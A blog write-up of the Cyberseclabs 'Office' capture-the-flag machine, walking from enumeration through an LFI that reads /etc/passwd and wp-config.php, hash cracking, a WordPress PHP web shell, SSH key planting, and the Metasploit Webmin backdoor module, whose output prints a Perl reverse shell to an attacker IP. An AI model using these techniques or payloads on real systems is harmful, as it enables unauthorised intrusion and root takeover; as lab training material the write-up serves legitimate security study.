---
title: "Office"
date: 2022-09-16T18:33:31+01:00
draft: false
categories:
  - Cyberseclabs
---

Quick note: I have been way too generous in this writeup but hey...it's on me! I gave so many credentials (but no flags) making it easier than it should be. But it's okay. If you really wanna learn you will learn. Now let's get started

## Enumeration


```bash
PORT      STATE    SERVICE          REASON      VERSION
22/tcp    open     ssh              syn-ack     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e2:3f:6c:4e:6d:8b:dc:59:b7:cb:66:64:27:f9:22:86 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC+gFggQqxPisakN8dYc6fbiOED+I+HD7Le9lgYUcrpjdKozChagwV9s3ZKTGkgmkOpMVz9Ifhv3LnoXcNACuKDWU7d6HCX0Ab+cJMwGX/D68AZBNlaFNyrJgUg52omwRs0aktor1TSxkjugyTaXY5LG1fl9/ZNm7OJaX3T8CCADnqDtsKAXPOEku90jUcnf1fkTr/rW2gkQbmfh/QwRO2jPHDtfdnObmwCslGdWDi1pg8IcMsw86enF5sZOjzAqJADbmY9H7gg77nPZCH9GMh5wv4Cb/y/c3o923EJ4h1MimpGj60aa2S1UKmjKs/e7pzoHGZYbadapvwne/94S2Xl
|   256 ee:be:37:f3:75:4e:38:2a:a9:99:e0:18:1a:b8:d1:41 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPmYME2CvT8Wufq97CVcM38cok+baDhxKCQ7dkt2/5uvS/ILT++6C/0CFsmj1/oZv9JWBDu4uVnnaxLdn1o7mKY=
|   256 7f:72:a7:29:be:30:9e:5e:aa:b9:fc:be:09:d2:8b:3a (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPlt+7kyv4MWbk8UhliuRGa5/T+3QiGgzj9XgWcHb+AQ

80/tcp    open     http             syn-ack     Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-generator: WordPress 5.4.1
|_http-title: Dunder Mifflin &#8211; Just another WordPress site

443/tcp   open     ssl/http         syn-ack     Apache httpd 2.4.29 ((Ubuntu))
| tls-alpn:
|_  http/1.1
|_http-server-header: Apache/2.4.29 (Ubuntu)
| ssl-cert: Subject: commonName=office.csl/organizationName=Dunder Mifflin/stateOrProvinceName=PA/countryName=US/localityName=Scranton/emailAddress=dwight@office.csl
| Issuer: commonName=office.csl/organizationName=Dunder Mifflin/stateOrProvinceName=PA/countryName=US/localityName=Scranton/emailAddress=dwight@office.csl
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2020-05-08T20:01:51
| Not valid after:  2021-05-08T20:01:51
| MD5:   e159 faf3 e637 25ad 7d95 3210 9a69 bce6
| SHA-1: adee e6e5 1566 a86f c8d9 6d7e 1fc0 2239 e21e 92ef
| -----BEGIN CERTIFICATE-----
| MIIF2zCCA8OgAwIBAgIUclv5tp1a/+9jd8c5WFlk2dNYSzwwDQYJKoZIhvcNAQEL
| BQAwfTELMAkGA1UEBhMCVVMxCzAJBgNVBAgMAlBBMREwDwYDVQQHDAhTY3JhbnRv
| bjEXMBUGA1UECgwORHVuZGVyIE1pZmZsaW4xEzARBgNVBAMMCm9mZmljZS5jc2wx
| IDAeBgkqhkiG9w0BCQEWEWR3aWdodEBvZmZpY2UuY3NsMB4XDTIwMDUwODIwMDE1
| MVoXDTIxMDUwODIwMDE1MVowfTELMAkGA1UEBhMCVVMxCzAJBgNVBAgMAlBBMREw
| DwYDVQQHDAhTY3JhbnRvbjEXMBUGA1UECgwORHVuZGVyIE1pZmZsaW4xEzARBgNV
| BAMMCm9mZmljZS5jc2wxIDAeBgkqhkiG9w0BCQEWEWR3aWdodEBvZmZpY2UuY3Ns
| MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAyzFMJrdDgahPUQwFRU5i
| /m0PcvBBIY2BvfxBrb6aQ8WHpj5rcKBFZbBuLK5sPWazz+Tc4jhjqOQ14/x9NTZx
| L0/1Oyq57psmoVbMKEtFOUC5uBv0Akp6fOZEDf4IZ5CpyO04OAVKqts4T/0Rxjem
| dwcuLtP4W95Q8Qt0SJn4ITlb8a3ehBhON5BvTBEL048mAzY0ZTFtNa3cCVJyGQZT
| uXI/qqwhrUKDD8Z5VdHrNBjawF+2e5KB+fPoaz7+KlgBMLdMhB6tDM/Ge4FP4XcH
| vshqy6PUW2cEIlKp0Rexy45VL6mNM3bdpHU/mEjA4G0Km88uw0Ckzi46X3+3gWl2
| j3347PbXBwos/AFR848o5o+w6MZk7GW3nSFZCN714PTdyxVebJhdORG952Npe5x1
| FGuIoTu5w+dW2GOo4/puU6eDfomq94/cF/AYXXvRJlFAJDgTMDWqIaazQ1sEbc/s
| X+rSeHON0Q9eiq8DJPi7Vb+5K59QW2Ivyo+GiRqbL7T3zIqLgfwU1w3g6V/yEoJW
| N1LBCW4vktelDmujHNQpeqVbgIkxi6hrEBy+uSlc/ItJOZ80SX26Gb1k1yDAs2up
| yCNbrb0/wOgOooIU+t7SL5gEBscfuhY6apb+KffL8+pfj+MnRARRS+o8AHR6CSkL
| 7MjkR4E8pk09AszIFsbqUacCAwEAAaNTMFEwHQYDVR0OBBYEFP4XwrmZnpFSInDH
| /riI853iqOMFMB8GA1UdIwQYMBaAFP4XwrmZnpFSInDH/riI853iqOMFMA8GA1Ud
| EwEB/wQFMAMBAf8wDQYJKoZIhvcNAQELBQADggIBAD8fOtMsIsVtzesL0lMH8aQu
| innrVX4PG4biu3yH1JmwRpJ8wWLycrxh/rWQQJhKLGYyFQOzBcEw39ptSdQrmyVB
| harz7BqJ1VY1sDmLUg76bsCeTjmiaP7lw1UvMWgTBVpMyLMFEtuEAfbKZFsJzCiD
| i38EX9sTkjqn3ZcEpfKK4xitlPLxNrL1pshJhg4mBhbiKzzCsSEb1uvjefEm6PAe
| OewZ5jORiQLW2dUirCYxxYOjISVB38qXsgprrjhzvE2F4qLKQzt45eN9IoyI+8+l
| Ta6pdXYczkRvy4UlwZeVWopTEwpoRGwNIPAU/cFPEqs7zRBCZAGW12TWQkQ8MC75
| J5FlSR4lv40EmuqGEalcDXnGdJXxLtDcauTygMnLCrp5wWfHGakkRIHJDUiLw2VO
| VJYxayTxp0r3Rk/2M6kHf12frhkzqv24eP/moLj73yBqJOanp2akQhRUe40ockMl
| HWzY5Y2ujilPHJn4ndPYgFwGhZIdgBOJ0mQlNLGSuZwL2sXo9CdQcJFvEz/C3Y5X
| +fNjCb9ZFQXl0Ybmi8zlM1wF0oncc3AcodPTi3VTbfvwvbQ+Wav6Lah4v1fyCdvl
| 9zAEyYXMnQdNuVVEB+BKVxgVRr/bplf2H1cquvgxUY+LstNh8rKbBn4guWp5yJ7m
| ClSGew5a8zXLdnOZ6F5z
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
| http-methods:
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Apache2 Ubuntu Default Page: It works
10000/tcp filtered snet-sensor-mgmt no-response
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.

```

```bash
                        [Status: 200, Size: 32243, Words: 1617, Lines: 441]
.hta                    [Status: 403, Size: 275, Words: 20, Lines: 10]
.htaccess               [Status: 403, Size: 275, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 275, Words: 20, Lines: 10]
index.php               [Status: 301, Size: 0, Words: 1, Lines: 1]
server-status           [Status: 403, Size: 275, Words: 20, Lines: 10]
wp-admin                [Status: 301, Size: 311, Words: 20, Lines: 10]
wp-content              [Status: 301, Size: 313, Words: 20, Lines: 10]
wp-includes             [Status: 301, Size: 314, Words: 20, Lines: 10]
xmlrpc.php              [Status: 405, Size: 42, Words: 6, Lines: 1]
```

On the website

```text
Hey guys, it’s your future manager, Dwight.

Yes, you heard that right! I made an accountability booster to set off once you guys make 5 mistakes in a single day, which I bet will happen!

I started a forum page on a subdomain, y’all can vent there before I send out an email to corporate.

PS: Can’t wait to fire you Jim! 😉
```

LMAO! ok now I get the theme...its the `office`

It have to be funny

ok we need to fuzz for `subdomains`


when we click on login or visit `wp-admin` we are redirected to `office.csl`

we need to add it to our `/etc/hosts` with current ip.address

```bash
└──╼ $ffuf -c -w /usr/share/wordlists/dirb/common.txt -u http://office.csl -H "HOST: FUZZ.office.csl" -fs 32243,0

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://office.csl
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Header           : Host: FUZZ.office.csl
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 32243,0
________________________________________________

forum                   [Status: 200, Size: 8773, Words: 1999, Lines: 298]
:: Progress: [4614/4614] :: Job [1/1] :: 11 req/sec :: Duration: [0:14:09] :: Errors: 32 ::
```

we add the subdomain `forum` too

We access the forum...it's Hilarious!

the chatlog page url looks like this

`http://forum.office.csl/chatlogs/chatlogs.php?file=chatlog.txt`

Found it yet? yes LFI it is!!

reading `/etc/passwd` we get 2 users (except root of course)

```bash
ryan:x:1000:1000:ryan:/home/ryan:/bin/bash
dwight:x:1001:1001:Dwight Schrute,,,:/home/dwight:/bin/bash
```

As it is a wordpress installation maybe we can read `wp-config.php`

Or we can use `wpscan` to enumerate it faster

the ssl certificate in nmap got `dwight email` as `dwight@office.csl` it may be valid for wordpress...now we need his password

Anyway we try to read `/var/www/html/wordpress/wp-config.php` bypassing the `php filter` by base64-encoding the result

Then we decode it

```php
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress_db' );

/** MySQL database username */
define( 'DB_USER', 'wp_user' );

/** MySQL database password */
define( 'DB_PASSWORD', 'password' );

/** MySQL hostname */
define( 'DB_HOST', 'localhost' );

/** Database Charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The Database Collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'K?*8s`Xfnkt9?74>//s#el MgR,W)SU=GI{T1Lgk2|LvxpwCNB)xh[ Y2R}DKex*' );
define( 'SECURE_AUTH_KEY',  'qZEh{g*6 wQ=pPyrviUBo,jolsX }CS=}Al6aZ!)jNUrrtS`Pu,GWVmN1B/T81k)' );
define( 'LOGGED_IN_KEY',    'ycKjK|*?NmdO>-=i=f[|)3{%`NbgJ0mPg,$}AN<20c`w/uN9 Cl%x~-t7%79A}|R' );
define( 'NONCE_KEY',        's,S|QP}:kVxnCojN2/$t>+yIZg@h-*.)P)%>Z!4V|gw|^]cGb[c9P1)CtZlda4/$' );
define( 'AUTH_SALT',        'N3XWgQ0nVzDJIYGF8aMAQC|-_/tyVnbu)<Vg|zp?`:E`&H|;,BD*=(,rwACgLQto' );
define( 'SECURE_AUTH_SALT', '{`p%d_ml^Z.qz=I{ R&h7emWoB<CB:Vu3Y&XZ:cD@j[y&A(dK`;j)QoR4Lr_w&`?' );
define( 'LOGGED_IN_SALT',   'F uf_8rV&iJ+K24pxZ_c7_<olfPj+k1E%Sp?Og!iBtUeMef^z9.=@Bfdj@(%|;20' );
define( 'NONCE_SALT',       ' v<tz;lAI5B4Mbv{|N]soUcC;tGCCz^rxGb-{*l,W55Zl&&XOPTg<-RRWR{)u}I;' );

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
        define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
```

Ok now we got `wp_user : password` but that is not very useful yet

we look for other files...

Lol `.htpasswd` got dwight creds...but hashed

```sh
dwight:$apr1$7FARE4DE$lKgF/R9rSUEY6s.L79/dM/
```
its md5 APR (hashcat mode 1600)

and we get `dwight : cowboys1`

we use `dwight@office.csl` with that password to get to the wordpress dashboard

## Exploitation

Upload a [PHP shell](shell.php) in the WP file manager and get access on a netcat listenner

(maybe we could use the plugins too but we would have to format our php file as a wp plugin and zip it...tedious)

Visit `http://office.csl/shell.php` to get inside..."the office"

```bash
$ cd /home/dwight
$ ls
access.txt
$ cat access.txt
access_flag_here
```

## privilege escalation

we have write permissions to his `.ssh` folder

```bash
$ sudo -l
Matching Defaults entries for www-data on office:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on office:
    (dwight) NOPASSWD: /bin/bash
```

and we can switch to dwight lol

```bash
$ sudo -u dwight /bin/bash
whoami
dwight
python3 -c 'import pty;pty.spawn("/bin/bash")'
dwight@office:~/.ssh$
```

Generate new `ssh keys` for dwight

```bash
dwight@office:~/.ssh$ ssh-keygen
ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (/home/dwight/.ssh/id_rsa):

Enter passphrase (empty for no passphrase):

Enter same passphrase again:

Your identification has been saved in /home/dwight/.ssh/id_rsa.
Your public key has been saved in /home/dwight/.ssh/id_rsa.pub.
The key fingerprint is:
SHA256:idjQRF1GQum8RxJ5md/0V8XxjbkP3RMJgHb0Dvg6Fo8 dwight@office
The key's randomart image is:
+---[RSA 2048]----+
|     .ooo=*=.. o+|
|     o  ===.. oo*|
|    . .o.+.o +o++|
|     + .+.o + .o=|
|    . o S= . .o.+|
|        . *    o.|
|         E .    .|
|        . .      |
|                 |
+----[SHA256]-----+
```

Add `public key` to `authorizzed_keys`

```bash
dwight@office:~/.ssh$ ls -al
ls -al
total 16
drwxrwxr-x 2 dwight dwight 4096 Nov 30 22:33 .
drwxr-xr-x 4 dwight dwight 4096 May  8  2020 ..
-rw------- 1 dwight dwight 1679 Nov 30 22:33 id_rsa
-rw-r--r-- 1 dwight dwight  395 Nov 30 22:33 id_rsa.pub
dwight@office:~/.ssh$ cat id_rsa.pub
cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPgHai3fDZqwsaQmTnVZcYGEkyQ3HqauRoDw83519IcId1kQxb+dtzC4ADYtXSLIzyc8H53dwW9aTIzX7j/lddQDfuqD4j7iJi8qMNMGtNQyrRdLRlxJPEo3M3Or0+qbaPMXfNVXfNnCFIeInzJhzLPKpZS5eYh7IJryhjEWwMHhm+mE+0xCd+z7FswoyKRSRIeR8hdeKhRuJ+UJTTD4GHI/6fOExMftoQwdfMUUon303/V6zwaky4s0d6R5OTesq/bcn2VE1CiDG/r29wSc5y44tHjyvfh80DkyaE8Yvr6j4PRxgAvRn7CP3CIBA67cHkXaHMV7i1rEJ8OEX/AEot dwight@office
dwight@office:~/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPgHai3fDZqwsaQmTnVZcYGEkyQ3HqauRoDw83519IcId1kQxb+dtzC4ADYtXSLIzyc8H53dwW9aTIzX7j/lddQDfuqD4j7iJi8qMNMGtNQyrRdLRlxJPEo3M3Or0+qbaPMXfNVXfNnCFIeInzJhzLPKpZS5eYh7IJryhjEWwMHhm+mE+0xCd+z7FswoyKRSRIeR8hdeKhRuJ+UJTTD4GHI/6fOExMftoQwdfMUUon303/V6zwaky4s0d6R5OTesq/bcn2VE1CiDG/r29wSc5y44tHjyvfh80DkyaE8Yvr6j4PRxgAvRn7CP3CIBA67cHkXaHMV7i1rEJ8OEX/AEot dwight@office" > authorized_keys
<HMV7i1rEJ8OEX/AEot dwight@office" > authorized_keys
```

Grab the [`private key`](id_rsa) and you got ssh access as dwight

Don't forget to fix the ssh key permissions

```bash
└──╼ $chmod 600 id_rsa

└──╼ $ssh dwight@172.31.3.1 -i id_rsa
...
dwight@office:~$ id
uid=1001(dwight) gid=1001(dwight) groups=1001(dwight)

```

I tried basic stuff like sudo and suid but no clue

I decided to o back to web folder to enumerate files...I already saw a `Webmin.out` file
when I took access as `www-data`

and now I got a `/var/webmin` folder...unusual

```bash
dwight@office:/var$ ls -al
total 60
drwxr-xr-x 15 root root   4096 May  8  2020 .
drwxr-xr-x 24 root root   4096 May  8  2020 ..
drwxr-xr-x  2 root root   4096 May  9  2020 backups
drwxr-xr-x 12 root root   4096 May  8  2020 cache
drwxrwxrwt  2 root root   4096 Feb  3  2020 crash
drwxr-xr-x 40 root root   4096 May  8  2020 lib
drwxrwsr-x  2 root staff  4096 Apr 24  2018 local
lrwxrwxrwx  1 root root      9 Feb  3  2020 lock -> /run/lock
drwxrwxr-x 11 root syslog 4096 May  8  2020 log
drwxrwsr-x  2 root mail   4096 Feb  3  2020 mail
drwxr-xr-x  2 root root   4096 Feb  3  2020 opt
lrwxrwxrwx  1 root root      4 Feb  3  2020 run -> /run
drwxr-xr-x  3 root root   4096 May  8  2020 snap
drwxr-xr-x  4 root root   4096 Feb  3  2020 spool
drwxrwxrwt  5 root root   4096 Nov 30 22:39 tmp
drwx------  3 root bin    4096 Nov 30 19:03 webmin
drwxr-xr-x  3 root root   4096 May  8  2020 www
```

Google (wikipedia) say its a web server interface for administration...

...that runs by default on `port 10000`

you can confirm that with `netstat -tunlp`

It runs locally (nmap didnt get that) we need to `port-forward` it to us

for that tunneling we can use `chisel` which require uploading the server  or use `ssh`

I go for ssh...choose any way you know...or not (XD I am personally learning it now as I already know chisel and sshutle...)

SSH local Port Forwarding syntax :

`ssh -L [LOCAL_IP:]LOCAL_PORT:DESTINATION:DESTINATION_PORT [USER@]SSH_SERVER`

Visit `127.0.0.1:port` for access

Aaaand it was hard to make it work...(timeout errors)

```bash
└──╼ $ssh -L 10000:127.0.0.1:10000 dwight@office.csl -i id_rsa -v

dwight@office:~$ debug1: Connection to port 10000 forwarding to 127.0.0.1 port 10000 requested.
debug1: channel 3: new [direct-tcpip]

...
```

we see the login portal but that's all, we have no valid creds

we fire metasploit and search for exploits

one is particularly interesting, its a backdoor payload we can install

```bash
msf6 exploit(linux/http/webmin_backdoor) > options

msf6 exploit(linux/http/webmin_backdoor) > set RHOSTS 127.0.0.1
RHOSTS => 127.0.0.1
msf6 exploit(linux/http/webmin_backdoor) > set RPORT 10000
RPORT => 10000
msf6 exploit(linux/http/webmin_backdoor) > set LHOST 10.10.0.223
LHOST => 10.10.0.223

msf6 exploit(linux/http/webmin_backdoor) > run

[+] perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"10.10.0.223:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
[-] Handler failed to bind to 10.10.0.223:4444:-  -
[*] Started reverse TCP handler on 0.0.0.0:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Webmin 1.890 detected
[+] Webmin 1.890 is a supported target
[+] Webmin executed a benign check command
[+] The target is vulnerable.
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/reverse_perl command payload
[*] Generated command payload: perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"10.10.0.223:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
[*] Command shell session 1 opened (10.0.2.15:4444 -> 10.0.2.2:48714) at 2021-12-01 01:37:47 +0100

id
uid=0(root) gid=0(root) groups=0(root)

shell
[*] Trying to find binary 'python' on the target machine
[*] Found python at /usr/bin/python
[*] Using `python` to pop up an interactive shell
[*] Trying to find binary 'bash' on the target machine
[*] Found bash at /bin/bash
cd /root
cd /root
root@office:~# ls
ls
system.txt
root@office:~# cat system.txt
cat system.txt
system_flag_here
```

the End! * insert the office ending theme here
